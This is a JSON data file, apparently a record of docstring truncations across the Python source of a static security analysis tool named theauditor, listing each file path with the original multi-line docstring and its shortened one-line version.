    "file": "theauditor/ast_extractors/typescript_impl.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Extract function calls with arguments from TypeScript semantic AST.\n\n    CRITICAL FIX: Now uses line-based scope mapping instead of broken recursive tracking.\n    This solves the \"100% anonymous caller\" problem that crippled taint analysis.\n    \"\"\"",
    "truncated": "\"\"\"Extract function calls with arguments from TypeScript semantic AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Recursively collect all function declarations with their line ranges.\n\n        CRITICAL FIX: Now handles PropertyDeclaration with wrapped functions\n        (e.g., create = this.asyncHandler(async (req, res) => {}))\n        \"\"\"",
    "truncated": "\"\"\"Recursively collect all function declarations with their line ranges.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Extract COMPLETE function AST nodes from TypeScript semantic AST.\n\n    This returns the full AST node for each function, including its body,\n    which is essential for Control Flow Graph construction.\n    \"\"\"",
    "truncated": "\"\"\"Extract COMPLETE function AST nodes from TypeScript semantic AST.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/analyzer.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Run all CDK security rules and return findings.\n\n        Returns:\n            List of CdkFinding objects\n        \"\"\"",
    "truncated": "\"\"\"Run all CDK security rules and return findings.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/analyzer.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"AWS CDK security analyzer.\n\nRuns CDK security rules via RulesOrchestrator and stores findings to database.\nFollows the same pattern as TerraformAnalyzer for architectural consistency.\n\"\"\"",
    "truncated": "\"\"\"AWS CDK security analyzer.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Find function containing the given file:line location.\n\n    Uses symbols table to find function definitions that span the line.\n    \"\"\"",
    "truncated": "\"\"\"Find function containing the given file:line location.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    BFS through function_call_args (fallback when graphs.db unavailable).\n\n    WARNING: This does NOT see interceptor edges. Only used as fallback.\n    \"\"\"",
    "truncated": "\"\"\"BFS through function_call_args (fallback when graphs.db unavailable).\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize the AST cache.\n\n        Args:\n            cache_dir: Base directory for cache files\n        \"\"\"",
    "truncated": "\"\"\"Initialize the AST cache.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Invalidate cache entry for a specific file.\n\n        Args:\n            key: SHA256 hash of the file content\n        \"\"\"",
    "truncated": "\"\"\"Invalidate cache entry for a specific file.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get cache statistics.\n\n        Returns:\n            Dictionary with cache metrics\n        \"\"\"",
    "truncated": "\"\"\"Get cache statistics.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get total disk usage of AST cache.\n\n        Returns:\n            Total size in bytes\n        \"\"\"",
    "truncated": "\"\"\"Get total disk usage of AST cache.\"\"\""
  },
  {
    "file": "theauditor/cache/ast_cache.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"AST cache management for improved parsing performance.\n\nThis module provides persistent caching for Abstract Syntax Trees,\navoiding repeated parsing of unchanged files.\n\"\"\"",
    "truncated": "\"\"\"AST cache management for improved parsing performance.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Build import graph from graphs.db.\n\n        Optimization: Bulk add_edges_from for 10x speedup.\n        NO FALLBACK - crashes if query fails.\n        \"\"\"",
    "truncated": "\"\"\"Build import graph from graphs.db.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Build call graph for symbol-level analysis.\n\n        Only includes functions/classes within live modules.\n        NO FALLBACK - crashes if query fails.\n        \"\"\"",
    "truncated": "\"\"\"Build call graph for symbol-level analysis.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Export zombie cluster as DOT file for visualization.\n\n        NO FALLBACK - crashes if pydot not installed.\n        User must install pydot if they want visualization.\n        \"\"\"",
    "truncated": "\"\"\"Export zombie cluster as DOT file for visualization.\"\"\""
  },
  {
    "file": "theauditor/docs_fetch.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Check latest versions and compare to locked versions.\n\n    This is a wrapper around deps.check_latest_versions for consistency.\n    \"\"\"",
    "truncated": "\"\"\"Check latest versions and compare to locked versions.\"\"\""
  },
  {
    "file": "theauditor/events.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Event system for pipeline observers.\n\nDecouples pipeline execution from presentation logic.\nAdheres to ZERO FALLBACK POLICY: Observers must handle their own exceptions.\n\"\"\"",
    "truncated": "\"\"\"Event system for pipeline observers.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect all frameworks in the project.\n\n        Returns:\n            List of detected framework info dictionaries.\n        \"\"\"",
    "truncated": "\"\"\"Detect all frameworks in the project.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Format detected frameworks as a table.\n\n        Returns:\n            Formatted table string.\n        \"\"\"",
    "truncated": "\"\"\"Format detected frameworks as a table.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Export detected frameworks to JSON.\n\n        Returns:\n            JSON string.\n        \"\"\"",
    "truncated": "\"\"\"Export detected frameworks to JSON.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Save detected frameworks to a JSON file.\n\n        Args:\n            output_path: Path where the JSON file should be saved.\n        \"\"\"",
    "truncated": "\"\"\"Save detected frameworks to a JSON file.\"\"\""
  },
  {
    "file": "theauditor/graph/builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Return structured import metadata for the given file.\n\n        NO DATABASE ACCESS - Uses pre-loaded cache (O(1) lookup).\n        Cache normalizes paths internally (Guardian of Hygiene).\n        \"\"\"",
    "truncated": "\"\"\"Return structured import metadata for the given file.\"\"\""
  },
  {
    "file": "theauditor/graph/builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Return exported symbol metadata for the given file.\n\n        NO DATABASE ACCESS - Uses pre-loaded cache (O(1) lookup).\n        Cache normalizes paths internally (Guardian of Hygiene).\n        \"\"\"",
    "truncated": "\"\"\"Return exported symbol metadata for the given file.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize CFG builder with database connection.\n\n        Args:\n            db_path: Path to the repo_index.db database\n        \"\"\"",
    "truncated": "\"\"\"Initialize CFG builder with database connection.\"\"\""
  },
  {
    "file": "theauditor/graph/db_cache.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Load all graph-relevant data from database in bulk.\n\n        NO TRY/EXCEPT - Let database errors crash (zero fallback policy).\n        If this fails, database schema is wrong and must be fixed.\n        \"\"\"",
    "truncated": "\"\"\"Load all graph-relevant data from database in bulk.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize DFG builder with database path.\n\n        Args:\n            db_path: Path to repo_index.db database\n        \"\"\"",
    "truncated": "\"\"\"Initialize DFG builder with database path.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize with database connection.\n\n        Args:\n            db_path: Path to repo_index.db\n        \"\"\"",
    "truncated": "\"\"\"Initialize with database connection.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Path-Based Factual Correlation using Control Flow Graphs.\n\nThis module correlates findings based on control flow structure - purely factual\nrelationships about which findings execute together on the same paths.\n\"\"\"",
    "truncated": "\"\"\"Path-Based Factual Correlation using Control Flow Graphs.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_express.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Build edges connecting route handlers to controller implementations.\n\n        Bridges the gap between Express route handlers and their actual\n        controller method implementations.\n        \"\"\"",
    "truncated": "\"\"\"Build edges connecting route handlers to controller implementations.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/python_orm.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Lightweight view of Python ORM metadata for taint propagation.\n\n    Inlined from taint/orm_utils.py to keep graph logic self-contained.\n    The graph layer now owns all ORM relationship logic.\n    \"\"\"",
    "truncated": "\"\"\"Lightweight view of Python ORM metadata for taint propagation.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Load GraphQL schemas from graphql_schemas table.\n\n        Returns:\n            Number of schemas loaded\n        \"\"\"",
    "truncated": "\"\"\"Load GraphQL schemas from graphql_schemas table.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Generate synthetic symbol ID from path + name + line.\n\n        NOTE: symbols table has no symbol_id column (composite PK only).\n        We generate a stable synthetic ID for graphql_resolver_mappings.\n        \"\"\"",
    "truncated": "\"\"\"Generate synthetic symbol ID from path + name + line.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Build GraphQL argument to resolver parameter mappings.\n\n        Maps GraphQL field arguments to resolver function parameters for taint analysis.\n        Inserts into graphql_resolver_params table.\n        \"\"\"",
    "truncated": "\"\"\"Build GraphQL argument to resolver parameter mappings.\"\"\""
  },
  {
    "file": "theauditor/impact_analyzer.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Backward compatibility shim for impact_analyzer module.\n\nThis module has been moved to theauditor.insights.impact_analyzer.\nThis shim maintains backward compatibility for existing imports.\n\"\"\"",
    "truncated": "\"\"\"Backward compatibility shim for impact_analyzer module.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Detect if project is a monorepo and return source directories.\n\n        Returns:\n            Tuple of (is_monorepo, src_directories, root_entry_files)\n        \"\"\"",
    "truncated": "\"\"\"Detect if project is a monorepo and return source directories.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Walk directory and collect file information.\n\n        Returns:\n            Tuple of (files_list, statistics)\n        \"\"\"",
    "truncated": "\"\"\"Walk directory and collect file information.\"\"\""
  },
  {
    "file": "theauditor/indexer/core.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Core functionality for file system operations and AST caching.\n\nThis module contains the FileWalker class for directory traversal with monorepo\ndetection.\n\"\"\"",
    "truncated": "\"\"\"Core functionality for file system operations and AST caching.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Base database manager providing core infrastructure.\n\n    This class implements schema-driven database operations and generic batching.\n    It should be used as a base class with language-specific mixins.\n    \"\"\"",
    "truncated": "\"\"\"Base database manager providing core infrastructure.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Mixin providing add_* methods for CORE_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for CORE_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Core database operations for language-agnostic patterns.\n\nThis module contains add_* methods for CORE_TABLES defined in schemas/core_schema.py.\nHandles 21 core tables including files, symbols, assignments, function calls, CFG, and JSX variants.\n\"\"\"",
    "truncated": "\"\"\"Core database operations for language-agnostic patterns.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/frameworks_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Mixin providing add_* methods for FRAMEWORKS_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for FRAMEWORKS_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/frameworks_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Framework-specific database operations.\n\nThis module contains add_* methods for FRAMEWORKS_TABLES defined in schemas/frameworks_schema.py.\nHandles 5 framework tables including API endpoints, ORM relationships, and Prisma models.\n\"\"\"",
    "truncated": "\"\"\"Framework-specific database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"GraphQL-specific database operations.\n\nThis module contains add_* methods for GRAPHQL_TABLES defined in schemas/graphql_schema.py.\nHandles 8 GraphQL tables including schemas, types, fields, resolvers, and execution graph.\n\"\"\"",
    "truncated": "\"\"\"GraphQL-specific database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a Dockerfile EXPOSE port to the batch.\n\n        Schema: dockerfile_ports(file_path, port, protocol)\n        FK: docker_images.file_path (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a Dockerfile EXPOSE port to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a Dockerfile ENV/ARG variable to the batch.\n\n        Schema: dockerfile_env_vars(file_path, var_name, var_value, is_build_arg)\n        FK: docker_images.file_path (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a Dockerfile ENV/ARG variable to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a compose service port mapping to the batch.\n\n        Schema: compose_service_ports(file_path, service_name, host_port, container_port, protocol)\n        FK: compose_services(file_path, service_name) composite\n        \"\"\"",
    "truncated": "\"\"\"Add a compose service port mapping to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a compose service volume mapping to the batch.\n\n        Schema: compose_service_volumes(file_path, service_name, host_path, container_path, mode)\n        FK: compose_services(file_path, service_name) composite\n        \"\"\"",
    "truncated": "\"\"\"Add a compose service volume mapping to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a compose service environment variable to the batch.\n\n        Schema: compose_service_env(file_path, service_name, var_name, var_value)\n        FK: compose_services(file_path, service_name) composite\n        \"\"\"",
    "truncated": "\"\"\"Add a compose service environment variable to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a compose service capability (cap_add/cap_drop) to the batch.\n\n        Schema: compose_service_capabilities(file_path, service_name, capability, is_add)\n        FK: compose_services(file_path, service_name) composite\n        \"\"\"",
    "truncated": "\"\"\"Add a compose service capability (cap_add/cap_drop) to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a compose service dependency to the batch.\n\n        Schema: compose_service_deps(file_path, service_name, depends_on_service, condition)\n        FK: compose_services(file_path, service_name) composite\n        \"\"\"",
    "truncated": "\"\"\"Add a compose service dependency to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a Terraform resource property to the batch.\n\n        Schema: terraform_resource_properties(resource_id, property_name, property_value, is_sensitive)\n        FK: terraform_resources.resource_id (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a Terraform resource property to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a Terraform resource dependency to the batch.\n\n        Schema: terraform_resource_deps(resource_id, depends_on_resource)\n        FK: terraform_resources.resource_id (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a Terraform resource dependency to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Mixin providing add_* methods for INFRASTRUCTURE_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for INFRASTRUCTURE_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Infrastructure database operations.\n\nThis module contains add_* methods for INFRASTRUCTURE_TABLES defined in schemas/infrastructure_schema.py.\nHandles 18 infrastructure tables including Docker, Terraform, AWS CDK, and GitHub Actions.\n\"\"\"",
    "truncated": "\"\"\"Infrastructure database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a react component hook from flat junction array.\n\n        Used by _store_react_component_hooks handler for flat array from JS.\n        Schema: react_component_hooks(component_file, component_name, hook_name)\n        \"\"\"",
    "truncated": "\"\"\"Add a react component hook from flat junction array.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a react hook dependency from flat junction array.\n\n        Used by _store_react_hook_dependencies handler for flat array from JS.\n        Schema: react_hook_dependencies(hook_file, hook_line, hook_component, dependency_name)\n        \"\"\"",
    "truncated": "\"\"\"Add a react hook dependency from flat junction array.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a package dependency to the batch.\n\n        Schema: package_dependencies(file_path, name, version_spec, is_dev, is_peer)\n        FK: package_configs.file_path (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a package dependency to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a package script to the batch.\n\n        Schema: package_scripts(file_path, script_name, script_command)\n        FK: package_configs.file_path (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a package script to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a package engine requirement to the batch.\n\n        Schema: package_engines(file_path, engine_name, version_spec)\n        FK: package_configs.file_path (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a package engine requirement to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Add a package workspace to the batch.\n\n        Schema: package_workspaces(file_path, workspace_path)\n        FK: package_configs.file_path (TEXT)\n        \"\"\"",
    "truncated": "\"\"\"Add a package workspace to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Mixin providing add_* methods for NODE_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for NODE_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Mixin providing add_* methods for PYTHON_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for PYTHON_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/security_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Mixin providing add_* methods for SECURITY_TABLES.\n\n    CRITICAL: This mixin assumes self.generic_batches exists (from BaseDatabaseManager).\n    DO NOT instantiate directly - only use as mixin for DatabaseManager.\n    \"\"\"",
    "truncated": "\"\"\"Mixin providing add_* methods for SECURITY_TABLES.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/security_database.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Security-focused database operations.\n\nThis module contains add_* methods for SECURITY_TABLES defined in schemas/security_schema.py.\nHandles 5 security tables including SQL injection detection, JWT patterns, and environment variable usage.\n\"\"\"",
    "truncated": "\"\"\"Security-focused database operations.\"\"\""
  },
  {
    "file": "theauditor/indexer/exceptions.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Custom exceptions for the indexer module.\n\nContains exception classes for specific failure modes that require\nexplicit handling rather than generic error propagation.\n\"\"\"",
    "truncated": "\"\"\"Custom exceptions for the indexer module.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Return list of file extensions this extractor supports.\n\n        Returns:\n            List of file extensions (e.g., ['.py', '.pyx'])\n        \"\"\"",
    "truncated": "\"\"\"Return list of file extensions this extractor supports.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Auto-discover and register all extractor modules.\n\n        Scans the extractors/ directory for Python files, imports them,\n        and registers any BaseExtractor subclasses found.\n        \"\"\"",
    "truncated": "\"\"\"Auto-discover and register all extractor modules.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Get list of all supported file extensions.\n\n        Returns:\n            List of supported extensions\n        \"\"\"",
    "truncated": "\"\"\"Get list of all supported file extensions.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Extract config files directly to database (Gold Standard v1.2).\n\n    NO parsers, NO intermediate dicts, NO backward compatibility.\n    Direct YAML/JSON parsing → database storage.\n    \"\"\"",
    "truncated": "\"\"\"Extract config files directly to database (Gold Standard v1.2).\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Extractor for Prisma schema files.\n\n    Parses schema.prisma files to extract model definitions and field metadata.\n    Direct database writes via self.db_manager.add_prisma_model().\n    \"\"\"",
    "truncated": "\"\"\"Extractor for Prisma schema files.\"\"\""
  },
  {
    "file": "theauditor/indexer/metadata_collector.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Initialize metadata collector.\n\n        Args:\n            root_path: Root directory of the project to analyze\n        \"\"\"",
    "truncated": "\"\"\"Initialize metadata collector.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Run the complete indexing process.\n\n        Returns:\n            Tuple of (counts, stats) dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Run the complete indexing process.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Generate TypedDict for each table.\n\n        Returns:\n            Python code string with all TypedDict definitions\n        \"\"\"",
    "truncated": "\"\"\"Generate TypedDict for each table.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Generate accessor class for each table.\n\n        Returns:\n            Python code string with all accessor classes\n        \"\"\"",
    "truncated": "\"\"\"Generate accessor class for each table.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Generate SchemaMemoryCache class.\n\n        Returns:\n            Python code string with memory cache implementation\n        \"\"\"",
    "truncated": "\"\"\"Generate SchemaMemoryCache class.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Generate validation decorators for storage methods.\n\n        Returns:\n            Python code string with validation decorators\n        \"\"\"",
    "truncated": "\"\"\"Generate validation decorators for storage methods.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Generate all code components.\n\n        Returns:\n            Dictionary mapping component name to generated code\n        \"\"\"",
    "truncated": "\"\"\"Generate all code components.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Write generated code to files.\n\n        Args:\n            output_dir: Directory to write files to (defaults to same dir as codegen.py)\n        \"\"\"",
    "truncated": "\"\"\"Write generated code to files.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/utils.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Validate foreign key definition against schema.\n\n        Returns:\n            List of error messages (empty if valid)\n        \"\"\"",
    "truncated": "\"\"\"Validate foreign key definition against schema.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/core_storage.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Store Express middleware chains (PHASE 5).\n\n        Each chain record represents one handler in a route definition's execution order.\n        Example: router.post('/', mw1, mw2, controller) creates 3 records.\n        \"\"\"",
    "truncated": "\"\"\"Store Express middleware chains (PHASE 5).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/node_storage.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Store React component hooks from flat junction array.\n\n        Junction table: react_component_hooks(component_file, component_name, hook_name)\n        Replaces nested hooks_used array in react_components.\n        \"\"\"",
    "truncated": "\"\"\"Store React component hooks from flat junction array.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/node_storage.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Store React hook dependencies from flat junction array.\n\n        Junction table: react_hook_dependencies(hook_file, hook_line, hook_component, dependency_name)\n        Replaces nested dependency_vars array in react_hooks.\n        \"\"\"",
    "truncated": "\"\"\"Store React hook dependencies from flat junction array.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Store Python comprehensions (list/dict/set/generator).\n\n        Split from python_expressions to reduce NULL sparsity.\n        Uses two-discriminator pattern: comp_kind (table) + comp_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store Python comprehensions (list/dict/set/generator).\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/python_storage.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"Store Python control statements (break/continue/pass/assert/del/with).\n\n        Split from python_expressions to reduce NULL sparsity.\n        Uses two-discriminator pattern: statement_kind (table) + statement_type (extractor subtype).\n        \"\"\"",
    "truncated": "\"\"\"Store Python control statements (break/continue/pass/assert/del/with).\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract security pattern features from jwt_patterns and sql_queries tables.\n\n    Returns dict with keys: jwt_usage_count, sql_query_count, has_hardcoded_secret, has_weak_crypto\n    \"\"\"",
    "truncated": "\"\"\"Extract security pattern features from jwt_patterns and sql_queries tables.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract taint flow features from findings_consolidated table.\n\n    Returns dict with keys: critical_findings, high_findings, medium_findings, unique_cwe_count\n    \"\"\"",
    "truncated": "\"\"\"Extract taint flow features from findings_consolidated table.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract control flow complexity from cfg_blocks and cfg_edges tables.\n\n    Returns dict with keys: cfg_block_count, cfg_edge_count, cyclomatic_complexity\n    \"\"\"",
    "truncated": "\"\"\"Extract control flow complexity from cfg_blocks and cfg_edges tables.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Load historical findings from findings_consolidated table in past runs.\n\n    Returns dict with keys: total_findings, critical_count, high_count, recurring_cwes\n    \"\"\"",
    "truncated": "\"\"\"Load historical findings from findings_consolidated table in past runs.\"\"\""
  },
  {
    "file": "theauditor/insights/ml.py",
    "line": -1,
    "original_lines": 5,
    "original": "\"\"\"\n    Extract semantic import features to understand file purpose.\n\n    Returns dict with keys: has_http_import, has_db_import, has_auth_import, has_test_import\n    \"\"\"",
    "truncated": "\"\"\"Extract semantic import features to understand file purpose.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 5,
